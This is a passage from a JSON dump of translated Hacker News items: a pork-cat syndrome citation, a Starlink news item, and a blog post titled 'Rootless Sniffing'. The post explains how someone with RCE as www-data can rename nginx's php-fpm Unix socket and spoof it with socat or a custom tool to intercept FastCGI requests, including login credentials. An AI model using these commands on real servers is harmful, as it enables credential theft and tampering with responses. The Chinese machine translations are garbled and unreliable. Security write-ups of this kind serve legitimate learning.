the United States&#34;.  J Allergy Clin Immunol.  131 (3): 923\u2013925.  doi: 10.1016/j.jaci.2012.12.665.  PMC\u00a0  3594363.  PMID\u00a0 23352634.", "posttime": "2021-06-22 16:42:59", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u732a\u8089,cat", "title": "\u732a\u8089\u7efc\u5408\u75c7 ", "title_en": "Pork-Cat Syndrome", "transed": 1, "url": "https://en.wikipedia.org/wiki/Pork%E2%80%93cat_syndrome", "via": "", "real_tags": ["\u732a\u8089", "cat"]}, {"category": "", "categoryclass": "", "imagename": "08bf2195efba9e9b0f57154145ce93e9.jpg", "infoid": 1067391, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6089\u5c3c\uff1aStarlink\uff0cElon Musk\u7684\u536b\u661f\u4e92\u8054\u7f51\u5355\u5143\u548c\uff0339; S Spacex\uff0c\u9884\u8ba1\u5c06\u80fd\u591f\u5728\u4e5d\u6708\u5de6\u53f3\u63d0\u4f9b\u6301\u7eed\u7684\u5168\u7403\u8986\u76d6\uff0c\u4f46\u968f\u540e\u9700\u8981\u5bfb\u6c42\u76d1\u7ba1\u5ba1\u6279\uff0c\u5176\u603b\u7edfGwynne Shotwel\u5468\u4e8c\u8868\u793a\u3002\n \uff06\uff0334;\u6211\u4eec\u6210\u529f\u90e8\u7f72\u4e861,800\u5c81\u5de6\u53f3\u7684\u536b\u661f\uff0c\u5e76\u4e00\u65e6\u6240\u6709\u8fd9\u4e9b\u536b\u661f\u5230\u8fbe\u4ed6\u4eec\u7684\u8fd0\u8425\u8f68\u9053\uff0c\u6211\u4eec\u5c06\u5177\u6709\u6301\u7eed\u7684\u5168\u7403\u8986\u76d6\u8303\u56f4\uff0c\u56e0\u6b64\u5e94\u8be5\u50cf9\u6708\u7684\u65f6\u95f4\u8303\u56f4\u4e00\u6837\uff0c\uff06\uff0334;\u5979\u901a\u8fc7\u7f51\u7edc\u5e7f\u64ad\u544a\u8bc9\u4e86\u9ea6\u53e4\u7ef4\u96c6\u56e2\u6280\u672f\u4f1a\u8bae\u3002\n     \uff06\uff0334;\u4f46\u968f\u540e\u6211\u4eec\u6709\u76d1\u7ba1\u5de5\u4f5c\u8fdb\u5165\u6bcf\u4e2a\u56fd\u5bb6\u5e76\u83b7\u5f97\u6279\u51c6\u63d0\u4f9b\u7535\u4fe1\u670d\u52a1\u3002\uff06\uff0334;\n Shotwel\u8868\u793a\uff0cStarlink\u8ba1\u5212\u8ba1\u5212\u90e8\u7f7212,000\u9897\u536b\u661f\uff0c\u603b\u8ba1\u7ea6\u4e3a100\u4ebf\u7f8e\u5143\u7684\u8d39\u7528\uff0c\u76ee\u524d\u572811\u4e2a\u56fd\u5bb6\u63d0\u4f9bBeta\u670d\u52a1\u3002\n 5\u6708\uff0cMusk\u8868\u793a\uff0c\u4f4e\u5730\u8f68\u9053\u536b\u661f\u7f51\u7edc\u5df2\u6536\u5230\u8d85\u8fc7500,000\u4eba\u7684\u4e92\u8054\u7f51\u670d\u52a1\u9884\u8ba2\uff0c\u5e76\u9884\u8ba1\u4e0d\u4f1a\u6ee1\u8db3\u9700\u6c42\u7684\u6280\u672f\u95ee\u9898\u3002\n \u4eca\u5e74\u7f8e\u56fd\u8054\u90a6\u901a\u4fe1\u59d4\u5458\u4f1a\u6279\u51c6\u4e86Spacex\uff06\uff0339;\u8ba1\u5212\u5728\u8f83\u4f4e\u5730\u7403\u8f68\u9053\u4e0a\u90e8\u7f72\u4e00\u4e9bStarlink\u536b\u661f\uff0c\u800c\u4e0d\u662f\u8ba1\u5212\u4e3a\u76ee\u524d\u7f3a\u4e4f\u8bbf\u95ee\u7684\u4eba\u63d0\u4f9b\u9ad8\u901f\u5bbd\u5e26\u4e92\u8054\u7f51\u670d\u52a1\u3002\n     Starlink\u662f\u8d8a\u6765\u8d8a\u591a\u7684\u5c0f\u536b\u661f\u5236\u9020\u5546\u4e4b\u4e00\uff0c\u4e5f\u5305\u62ec\u4e9a\u9a6c\u900a\uff0c\u82f1\u56fd\uff06\uff0339; S Oneweb\uff0cVenture\u8d44\u672c\u652f\u6301\u7684\u661f\u7403\u548c\u96f7\u795e\u6280\u672f\u516c\u53f8\u7684\u84dd\u5ce1\u8c37\u6280\u672f\u3002 \n\u6765\u6e90\uff1a\u8def\u900f\u793e ", "note_en": "SYDNEY: Starlink, the satellite internet unit of Elon Musk&#39;s SpaceX, expects to be able to provide continuous global coverage by around September but will then need to seek regulatory approvals, its president Gwynne Shotwel said on Tuesday.\n &#34;We&#39;ve successfully deployed 1,800 or so satellites and once all those satellites reach their operational orbit, we will have continuous global coverage, so that should be like September timeframe,&#34; she told a Macquarie Group technology conference via webcast.\n     &#34;But then we have regulatory work to go into every country and get approved to provide telecoms services.&#34;\n Starlink, which has said it plans to deploy 12,000 satellites in total at a cost of roughly US$10 billion, currently offers beta services in 11 countries, Shotwel said.\n In May, Musk said the low-Earth orbiting satellite network had received more than 500,000 preorders for its internet service and anticipates no technical problems meeting demand.\n The U.S. Federal Communications Commission this year approved SpaceX&#39;s plan to deploy some Starlink satellites at a lower earth orbit than planned to provide high-speed broadband internet services to people who currently lack access.\n     Starlink is one of a growing number of makers of small satellites that also includes Amazon.com&#39;s Kuiper, Britain&#39;s OneWeb, venture capital-backed Planet, and Raytheon Technologies Corp&#39;s Blue Canyon Technologies.\n  Source: Reuters", "posttime": "2021-06-22 16:42:41", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "starlink,\u6280\u672f", "title": "Spacex\u7684Starlink\u671f\u671b\u5b83\u53ef\u4ee5\u57289\u6708\u5de6\u53f3\u63d0\u4f9b\u5168\u7403\u8986\u76d6\u8303\u56f4 ", "title_en": "SpaceX's Starlink expects it can provide global coverage around September", "transed": 1, "url": "https://www.channelnewsasia.com/news/business/spacex-s-starlink-expects-it-can-provide-global-coverage-around-september-15066036", "via": "", "real_tags": ["starlink", "\u6280\u672f"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067389, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u66fe\u51e0\u4f55\u65f6\uff0c\u4e00\u4e2a\u83dc\u9e1f\u5728\u670d\u52a1\u5668\u4e0a\u627e\u5230\u4e86\u4e00\u4e2aRCE\uff0c\u4f46\u6ca1\u6709\u5f97\u5230root\uff0cnoob\u60f3\u8981\u55c5\u63a2\u5230\u8fbe\u90a3\u4e2a\u670d\u52a1\u5668\u7684\u8bf7\u6c42\uff0c\u4ee5\u5347\u7ea7\u6743\u9650\uff0c\u4f46\u6ca1\u6709\u77e5\u9053\u5982\u4f55\u3002\u90a3\u4e2a\u83dc\u9e1f\u662f\u6211\uff0c\u8fd9\u662f\u6211\u7684\u6545\u4e8b\u3002\n  \u597d\u7684\uff0c\u5ffd\u7565\u5e9f\u8bdd\u4ecb\u7ecd\u3002\u6211\u53ef\u4ee5\u8bbf\u95eewww-data\u7528\u6237\uff0c\u670d\u52a1\u5668\u8fd0\u884cnginx + php-fpm\uff0c\u6211\u600e\u4e48\u80fd\u55c5\u5230\u8bf7\u6c42\u800c\u4e0d\u70d9\u5b83\u6765\u8fd0\u884ctcpdump\uff1f nginx\u548cphp-fpm\u4e3b\u8fdb\u7a0b\u4ee5root\u8eab\u4efd\u8fd0\u884c\uff0c\u4f46\u5de5\u4eba\u5728www-data\u4e0a\u8fd0\u884c\u3002\u54e6\uff0c\u8fd9\u662f\u4e00\u4e2a\u7801\u5934alpine\u5b9e\u4f8b\uff0cfack\u3002\n   \u60f3\u5230\u7684\u7b2c\u4e00\u4e2a\u60f3\u6cd5\u662f\u901a\u8fc7/ proc / pid / mem\u6765\u629b\u5f03nginx / php-fpm\u5de5\u4f5c\u8005\u7684\u8bb0\u5fc6\uff0c\u5e76\u5e0c\u671b\u8bf7\u6c42\u5728\u90a3\u91cc\u3002\u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e\u5b83\u7684\u6f02\u4eae\u7ebf\u7a0bUnix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux\u5f97\u5230\u4e86\u5927\u90e8\u5206\u4fe1\u606f\u3002\n \u6211\u9047\u5230\u7684\u95ee\u9898\u662f\u5927\u591a\u6570\u5de5\u5177/\u811a\u672c\u90fd\u4f7f\u7528ptrace syscall\u5728\u8f6c\u50a8\u4e4b\u524d\u9644\u52a0\u5230\u8fc7\u7a0b\uff0c\u5e76\u4e14\u60a8\u53ef\u4ee5\uff06\uff0339; t ptrace\u5728\u8c37\u4ed3\u4e0a\u7684\u8c37\u4ed3\u4e0a\u7684docker\u4e0a\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u914d\u7f6e - add = sys_ptrace\u6216docker-compose.yml\uff1a\n   \u57284.8\u4e4b\u540e\u7684Docker\u8fd0\u884c\u5185\u6838\u4e0a\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528process_vm_readv syscall\u8f6c\u50a8\u5185\u5b58\u800c\u65e0\u9700\u9644\u52a0\u5230\u5b83\uff0c\u4f46\u60a8\u4ecd\u7136\u53ef\u4ee5\uff06\uff0339; t\u8f6c\u50a8\u7528\u6237\u4e0b\u7684\u4efb\u4f55\u8fdb\u7a0b\u7684\u5185\u5b58\u3002\u5982\u679c/ proc / sys / kernel / yama / ptrace_scope\u8bbe\u7f6e\u4e3a1\uff0c\u5219\u53ea\u5141\u8bb8ptrace / process_vm_readv\u5982\u679c\u60a8\u7684powercess\u662f\u60a8\u60f3\u8981Ptrace\u7684\u7236\u4eb2\uff0c\u5982\u679c\u5b83\uff06\uff0339; s\u8bbe\u7f6e\u4e3a\u96f6\uff0c\u60a8\u53ef\u4ee5\u8f6c\u50a8\u5185\u5b58\uff0c\u4f46\u5b83\u9ed8\u8ba4\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\u9ed8\u8ba4\u4e3a\uff06\uff0339; s 1\u3002 yama On General\u4e0a\u66f4\u591a\u4fe1\u606f\uff1akernel.org/doc/documentation/security/yama.txt\n \u57fa\u672c\u4e0a\uff0c\u6211\u53ea\u80fd\u8f6c\u50a8\u6211\u5728\u6211\u7684\u7528\u6237\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u7684\u5185\u5b58\uff0c\u800c\u4e0d\u662f\u6211\u7684\u7528\u6237\u8fd0\u884c\u7684\u4efb\u4f55\u8fdb\u7a0b\u3002\u5de5\u4f5c\u4eba\u5458\u7531root\u4e0b\u8fd0\u884c\u7684\u5927\u5e08\u8fdb\u7a0b\u6267\u884c\uff1a\uff06\uff0339;\uff08\u6211\u4e5f\u53ef\u4ee5\u4ecewww-data\u5220\u9664\u4e00\u4e2a\u65b0\u5de5\u4eba\uff0c\u56e0\u4e3a\u4e3b\u8fdb\u7a0b\u5c06\u5ffd\u7565\u5b83\u3002\n    \u8fd9\u91cc\u7684\u60f3\u6cd5\u662f\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u8bf7\u6c42\uff0cnginx\u5de5\u4eba\u5c06\u6253\u5f00\u8be5\u5957\u63a5\u5b57\u7684\u65b0\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5982\u679ci\uff06\uff0339; m\u5feb\u901f\uff0cvia / proc / pid / fd / n\u53ef\u4ee5\u8f6c\u50a8\u4ed6\u7684\u5185\u5bb9\u3002\u5b83\uff06\uff0339;\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u60f3\u6cd5\uff0c\u4f46\u4f60\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u6587\u4ef6/ proc / pid / fd / n\u4e0e\u5957\u63a5\u5b57/\u7ba1\u9053\u4ea4\u4e92\u3002 \nWarning: Can only detect less than 5000 characters\n\u6240\u4ee5\u6211\u5236\u4f5c\u4e86\u4e00\u4e2a\u81ea\u52a8\u5316\u8fd9\u4e00\u6574\u4e2a\u8fc7\u7a0b\u7684\u811a\u672c\uff0c\u5e76\u786e\u4fdd\u5982\u679c\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\uff0c\u5b83\u5c06\u91cd\u547d\u540d\u65e7\u5957\u63a5\u5b57\u540e\u9000\uff0c\u4ee5\u4fbf\u670d\u52a1\u5668\u6ca1\u6709\u8131\u673a\uff06\uff0339;\n  / tmp $ ./dsm .php-fpm.sockUnix\u57df\u5957\u63a5\u5b57emifferby @caioluders [\uff1f]\u91cd\u547d\u540d\u4e3a.php-fpm.sock.1 [\uff1f]\u7ed1\u5b9a\u6b3a\u9a97\u5957\u63a5\u5b57.php-fpm.sock [\uff1f ]\u6b3a\u9a97\u5957\u63a5\u5b57\u6b63\u5728\u503e\u542c... [\uff1f]\u65b0\u8fde\u63a5---------------------------------------------- php-fpm.sock ------------------------------------------ recket_filename / api / public / index.php QUERY_STRINGq = /\uff06\u5b89\u57f9; REQUEST_METHODGET CONTENT_TYPECONTENT_LENGTHSCRIPT_NAME / index.php\u7684REQUEST_URI / DOCUMENT_URI / index.phpDOCUMENT_ROOT / API / publiSERVER_PROTOCOLHTTP / 1.1REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI / 1.1 SERVER_SOFTWAREnginx / 1.18.0REMOTE_ADDR172.18.0.1 REMOTE_PORT57778SERVER_ADDR172.18.0.2 SERVER_PORT80 SERVER_NAME_REDIRECT_STATUS200 HTTP_HOST127.0.0.1\uff1a9022RHTTP_USER_AGENTMozilla / 5.0\uff08Macintosh;\u82f1\u7279\u5c14Mac OS X 10.14; RV\uff1a85.0\uff09Gecko / 20100101 Firefox / 85.0 jhttp_accepttext / html\uff0capplication / xhtml + xml\uff0capplication / xml; q = 0.9\uff0cimhttp_accept_encodinggzip\uff0cdeflatenguagept-br\uff0cpt; q = 0.8 \uff0cen-US; q = 0.5\uff0cen; q = 0.3http_connectionKeep-Alivehttp_upgrade_inseCure_Requests1 --------------- ---------------------\u65b0\u6570\u636e\u5305----------------------- ----------------------------------------php-FPM\u3002\u889c\u5b501 ------------------------------------\u4e3b\u811a\u672cUnknownKStatus\uff1a404\u4e0d\u662fFoundX Powered-by\uff1a PHP / 7.4.15 CContent\u578b\uff1aTEXT / HTML; charset = UTF-8\u672a\u627e\u5230\u3002[\uff1f]\u65b0\u8fde\u63a5\n   \u5728UNIX\u5185\u6838\u4e0a\uff0c\u6211\u731c\u6d4b\u7684\u662f\u6211\u731c\u7684\u4e00\u4e2aWeb\u5bb6\u4f19\uff0c\u5e76\u5e2e\u52a9\u66f4\u597d\u5730\u4e86\u89e3Linux\u5185\u6838\u4e0a\u7684\u57fa\u672c\u6388\u6743\u6d41\u7a0b\uff0c\u771f\u7684\u5f88\u6709\u654f\u611f\u3002\u6211\u7684\u5927\u591a\u6570\u60f3\u6cd5\u90fd\u662f\u72d7\u5c4e\uff0c\u5e76\u6ca1\u6709\u5de5\u4f5c\uff0c\u53d1\u73b0\u6211\u53ef\u4ee5\u6b3a\u9a97unix\u57df\u5957\u63a5\u5b57\uff0cnginx\u5185\u90e8\u7528\u4e8e\u6211\u7684\u65b0\u6280\u672f\u3002\u5982\u679c\u60a8\u5728\u767b\u5f55POST\u8bf7\u6c42\u4e0a\u83b7\u53d6\u7eaf\u6587\u672c\u51ed\u636e\uff0c\u5219\u53ef\u4ee5\u5728\u7ea2\u8272\u7ec4\u5408\u4e0a\u4f7f\u7528\u7ea2\u8272\u7ec4\u5408\u4ee5\u5347\u7ea7\u6743\u9650\u3002\u60a8\u8fd8\u53ef\u4ee5\u505a\u7684\u4e0d\u4ec5\u4ec5\u662f\u55c5\u63a2\u8bf7\u6c42\uff1a\u60a8\u53ef\u4ee5\u66f4\u6539\u670d\u52a1\u5668\uff06\uff0339;\u54cd\u5e94\uff01\u4f7f\u7528\u4f60\u7684\u60f3\u8c61\u529b\uff0c\u4e5f\u8bb8\u6211\u4ee5\u540e\u505a\u4e00\u4e2a\u5de5\u5177\u6765\u5b9e\u73b0\u8fd9\u4e00\u70b9\u3002\n \u6211\u4e0d\u77e5\u9053\u54ea\u4e2a\u6846\u67b6\u4f7f\u7528Unix\u57df\u5957\u63a5\u5b57\u4ee5\u4e0enginx + php-fpm\u76f8\u540c\u7684\u65b9\u5f0f\u4f7f\u7528\uff0c\u4f46\u6211\u60f3\u5e94\u8be5\u5b58\u5728\u66f4\u591a\u7684\u4e0a\u4e0b\u6587\uff0c\u5982\u679c\u60a8\u53d1\u73b0\u66f4\u591a\u573a\u666f\uff0c\u8bf7\u53d1\u5e03\u5b83\u3002 ", "note_en": "Once upon a time, a noob found an RCE on a server but didn&#39;t got root, the noob wanted to sniff the requests that were arriving on that server, to escalate privileges, but didn&#39;t know how. That noob is me , and this is my story.\n  Okay, ignore the bullshit intro.I had access to the  www-data user, and the server was running  Nginx+php-fpm, how could I sniff the requests without rooting it to run  tcpdump? The  Nginx and  php-fpm master processes run as  root, but the workers run on  www-data. Oh, and it was a docker alpine instance, fack.\n   The first idea that came to mind was to just dump the memory of the  Nginx/php-fpm workers via the  /proc/PID/mem and hope that the requests are there. Here is a nice thread about it  unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux got most of the info there.\n The problem that I ran into was that most tools/scripts uses the  ptrace syscall to attach to the process before dumping it, and you can&#39;t  ptrace at all on Docker on kernels older than 4.8 without a specific config  --cap-add=SYS_PTRACE or on  docker-compose.yml :\n   On Docker running kernels after 4.8 you can use the  process_vm_readv syscall to dump the memory without attaching to it, but you still can&#39;t dump the memory of any process under your user. If the  /proc/sys/kernel/yama/ptrace_scope is set to  1 it will only allow  ptrace/ process_vm_readv if your proccess is the father of the process you want to  ptrace, if it&#39;s set to zero you can dump the memory, but it&#39;s  1 by default on most systems. More info on  Yama on general :  kernel.org/doc/Documentation/security/Yama.txt\n Basically I can only dump the memory of a process that I executed, not of any process running on my user. The workers are executed by the masters process that run under root :&#39;( I also can&#39;t just spawn a new worker from  www-data because the master process will ignore it.\n    The idea here was that to each request the Nginx worker was going to open a new file descriptor to that socket, and I could dump his contents, if I&#39;m quick, via  /proc/PID/fd/N. It&#39;s a nice idea, but you can&#39;t interact with sockets/pipes by just using the file  /proc/PID/fd/N.\n There is one way that I found to achieve this: copying all the file descriptors using the fairly new syscall  pidfd_getfd, this was introduced on kernel 5.6, with the  pidfd_open syscall you can open a new file descriptor that refers to another process, with that you can use  pidfd_getfd to copy all file descriptors and use them. Now for the sad part:  pidfd_getfd permissions are governed by  ptrace (T_T) So this falls in the same problem as dumping the memory.\n  Reading through the config file of  php-fpm I found out that it used a  Unix domain socket to communicate with Nginx using  Fastcgi , what a horrible name btw.\n  [...]; The address on which to accept FastCGI requests.; Valid syntaxes are:; &#39;ip.add.re.ss:port&#39; - to listen on a TCP socket to a specific IPv4 address on; a specific port;; &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on; a specific port;; &#39;port&#39; - to listen on a TCP socket to all addresses; (IPv6 and IPv4-mapped) on a specific port;; &#39;/path/to/unix/socket&#39; - to listen on a unix socket.; Note: This value is mandatory.listen = /tmp/.php-fpm.sock[...]\n So I began to search for ways of sniffing the Unix domain socket, and turns out it&#39;s pretty hard to properly sniff it, mainly because it isn&#39;t bound to any protocol, and most reliable ways use  ptrace, but a dirty hack it&#39;s to just rename the socket, everything&#39;s a file on unix yadayada, and create a new one that MiTM it , like this  superuser.com/a/576404, using  socat. Note that this only works if you can write on the socket&#39;s directory, I&#39;m still not sure if this is the default when using a supervisor, or it&#39;s a misconfig putting the socket on  /tmp, but surely it isn&#39;t that uncommon.So here&#39;s the first attempt using  socat :\n /tmp $ iduid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)/tmp $ mv .php-fpm.sock .php-fpm.sock.1/tmp $ ./socat -t100 -x -v UNIX-LISTEN:/tmp/.php-fpm.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/tmp/.php-fpm.sock.1&gt; 2021/03/25 08:47:56.069495 length=816 from=0 to=815 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00 ................ 01 04 00 01 03 06 02 00 0f 15 53 43 52 49 50 54 ..........SCRIPT 5f 46 49 4c 45 4e 41 4d 45 2f 61 70 69 2f 70 75 _FILENAME/api/pu 62 6c 69 63 2f 69 6e 64 65 78 2e 70 68 70 0c 07 blic/index.php.. 51 55 45 52 59 5f 53 54 52 49 4e 47 71 3d 2f 68 QUERY_STRINGq=/h 65 79 26 0e 03 52 45 51 55 45 53 54 5f 4d 45 54 ey&amp;..REQUEST_MET 48 4f 44 47 45 54 0c 00 43 4f 4e 54 45 4e 54 5f HODGET..CONTENT_ 54 59 50 45 0e 00 43 4f 4e 54 45 4e 54 5f 4c 45 TYPE..CONTENT_LE 4e 47 54 48 0b 0a NGTH.. 53 43 52 49 50 54 5f 4e 41 4d 45 2f 69 6e 64 65 SCRIPT_NAME/inde 78 2e 70 68 70 0b 04 52 45 51 55 45 53 54 5f 55 x.php..REQUEST_U 52 49 2f 68 65 79 0c 0a RI/hey.. 44 4f 43 55 4d 45 4e 54 5f 55 52 49 2f 69 6e 64 DOCUMENT_URI/ind 65 78 2e 70 68 70 0d 0b 44 4f 43 55 4d 45 4e 54 ex.php..DOCUMENT 5f 52 4f 4f 54 2f 61 70 69 2f 70 75 62 6c 69 63 _ROOT/api/public 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43 4f ..SERVER_PROTOCO 4c 48 54 54 50 2f 31 2e 31 0e 04 52 45 51 55 45 LHTTP/1.1..REQUE 53 54 5f 53 43 48 45 4d 45 68 74 74 70 11 07 47 ST_SCHEMEhttp..G 41 54 45 57 41 59 5f 49 4e 54 45 52 46 41 43 45 ATEWAY_INTERFACE 43 47 49 2f 31 2e 31 0f 0c 53 45 52 56 45 52 5f CGI/1.1..SERVER_ 53 4f 46 54 57 41 52 45 6e 67 69 6e 78 2f 31 2e SOFTWAREnginx/1. 31 38 2e 30 0b 0a 18.0.. 52 45 4d 4f 54 45 5f 41 44 44 52 31 37 32 2e 31 REMOTE_ADDR172.1 38 2e 30 2e 31 0b 05 52 45 4d 4f 54 45 5f 50 4f 8.0.1..REMOTE_PO 52 54 35 37 35 38 30 0b 0a RT57580.. 53 45 52 56 45 52 5f 41 44 44 52 31 37 32 2e 31 SERVER_ADDR172.1 38 2e 30 2e 32 0b 02 53 45 52 56 45 52 5f 50 4f 8.0.2..SERVER_PO 52 54 38 30 0b 01 53 45 52 56 45 52 5f 4e 41 4d RT80..SERVER_NAM 45 5f 0f 03 52 45 44 49 52 45 43 54 5f 53 54 41 E_..REDIRECT_STA 54 55 53 32 30 30 09 0e 48 54 54 50 5f 48 4f 53 TUS200..HTTP_HOS 54 31 32 37 2e 30 2e 30 2e 31 3a 39 30 32 32 0f T127.0.0.1:9022. 52 48 54 54 50 5f 55 53 45 52 5f 41 47 45 4e 54 RHTTP_USER_AGENT 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 4d 61 63 Mozilla/5.0 (Mac 69 6e 74 6f 73 68 3b 20 49 6e 74 65 6c 20 4d 61 intosh; Intel Ma 63 20 4f 53 20 58 20 31 30 2e 31 34 3b 20 72 76 c OS X 10.14; rv 3a 38 35 2e 30 29 20 47 65 63 6b 6f 2f 32 30 31 :85.0) Gecko/201 30 30 31 30 31 20 46 69 72 65 66 6f 78 2f 38 35 00101 Firefox/85 2e 30 0b 4a 48 54 54 50 5f 41 43 43 45 50 54 74 .0.JHTTP_ACCEPTt 65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61 ext/html,applica 74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61 tion/xhtml+xml,a 70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71 pplication/xml;q 3d 30 2e 39 2c 69 6d 61 67 65 2f 77 65 62 70 2c =0.9,image/webp, 2a 2f 2a 3b 71 3d 30 2e 38 14 23 48 54 54 50 5f */*;q=0.8.#HTTP_ 41 43 43 45 50 54 5f 4c 41 4e 47 55 41 47 45 70 ACCEPT_LANGUAGEp 74 2d 42 52 2c 70 74 3b 71 3d 30 2e 38 2c 65 6e t-BR,pt;q=0.8,en 2d 55 53 3b 71 3d 30 2e 35 2c 65 6e 3b 71 3d 30 -US;q=0.5,en;q=0 2e 33 14 0d 48 54 54 50 5f 41 43 43 45 50 54 5f .3..HTTP_ACCEPT_ 45 4e 43 4f 44 49 4e 47 67 7a 69 70 2c 20 64 65 ENCODINGgzip, de 66 6c 61 74 65 0f 0a flate.. 48 54 54 50 5f 43 4f 4e 4e 45 43 54 49 4f 4e 6b HTTP_CONNECTIONk 65 65 70 2d 61 6c 69 76 65 1e 01 48 54 54 50 5f eep-alive..HTTP_ 55 50 47 52 41 44 45 5f 49 4e 53 45 43 55 52 45 UPGRADE_INSECURE 5f 52 45 51 55 45 53 54 53 31 00 00 01 04 00 01 _REQUESTS1...... 00 00 00 00 01 05 00 01 00 00 00 00 ............--&lt; 2021/03/25 08:47:56.098735 length=168 from=0 to=167 01 07 00 01 00 16 02 00 50 72 69 6d 61 72 79 20 ........Primary 73 63 72 69 70 74 20 75 6e 6b 6e 6f 77 6e 00 00 script unknown.. 01 06 00 01 00 6b 05 00 53 74 61 74 75 73 3a 20 .....k..Status: 34 30 34 20 4e 6f 74 20 46 6f 75 6e 64 0d 0a 404 Not Found.. 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 50 48 X-Powered-By: PH 50 2f 37 2e 34 2e 31 35 0d 0a P/7.4.15.. 43 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 20 74 65 Content-type: te 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65 74 xt/html; charset 3d 55 54 46 2d 38 0d 0a =UTF-8.. 0d 0a .. 46 69 6c 65 20 6e 6f 74 20 66 6f 75 6e 64 2e 0a File not found.. 00 00 00 00 00 01 03 00 01 00 08 00 00 00 00 00 ................ 00 00 00 00 00 .....--\n Yay! The  socat worked locally and I was seeing the FastCGI requests, but  socat has some problems:\n I don&#39;t want to depend on  socat as it&#39;s a red flag on any server and a pretty big binary.\n So I made a script that automatizes this whole process, and makes sure that if anything goes wrong it will rename the old socket back so the server doesn&#39;t go offline.\n  /tmp $ ./dsm .php-fpm.sockUnix Domain Socket Snifferby @caioluders[?] Renamed .php-fpm.sock to .php-fpm.sock.1[?] Bind spoofed socket .php-fpm.sock[?] Spoofed socket is listening...[?] New connection------------------------------------ .php-fpm.sock ------------------------------------SCRIPT_FILENAME/api/public/index.php QUERY_STRINGq=/&amp;REQUEST_METHODGET CONTENT_TYPECONTENT_LENGTHSCRIPT_NAME/index.php REQUEST_URI/DOCUMENT_URI/index.phpDOCUMENT_ROOT/api/publiSERVER_PROTOCOLHTTP/1.1REQUEST_SCHEMEhttpGATEWAY_INTERFACECGI/1.1 SERVER_SOFTWAREnginx/1.18.0REMOTE_ADDR172.18.0.1 REMOTE_PORT57778SERVER_ADDR172.18.0.2 SERVER_PORT80 SERVER_NAME_REDIRECT_STATUS200 HTTP_HOST127.0.0.1:9022RHTTP_USER_AGENTMozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0 JHTTP_ACCEPTtext/html,application/xhtml+xml,application/xml;q=0.9,imHTTP_ACCEPT_ENCODINGgzip, deflateNGUAGEpt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3HTTP_CONNECTIONkeep-aliveHTTP_UPGRADE_INSECURE_REQUESTS1------------------------------------- New Packet ------------------------------------------------------------------------ .php-fpm.sock.1 -----------------------------------Primary script unknownkStatus: 404 Not FoundX-Powered-By: PHP/7.4.15Content-type: text/html; charset=UTF-8File not found.[?] New connection\n   It was really insightful to go this low on the unix kernel, I&#39;m more of a web guy I guess, and helped a lot to better understand basic authorization flows on the linux kernel. Altho most of my ideas were shit and didn&#39;t work, having found that I can spoof the Unix domain socket that the Nginx uses internally is a new technique for me. This can be used on red teaming to escalate privileges, if you weren&#39;t able to root it, by getting plain text credentials on a login POST request for example. You can also do more than just sniffing the requests: you can alter the server&#39;s responses! Use your imagination, maybe I make a tool later to achieve that.\n I don&#39;t know which frameworks uses a Unix domain socket in the same way as  Nginx+php-fpm, but I guess that should exist more contexts that this works, please publish it if you find more scenarios.", "posttime": "2021-06-22 15:54:57", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u55c5\u95fb,rootless,\u8fd0\u884c", "title": "\u65e0\u6839\u55c5\u95fb ", "title_en": "Rootless Sniffing", "transed": 1, "url": "https://lude.rs/h4ck1ng/rootless_sniffing.html", "via": "", "real_tags": ["\u55c5\u95fb", "rootless", "\u8fd0\u884c"]}]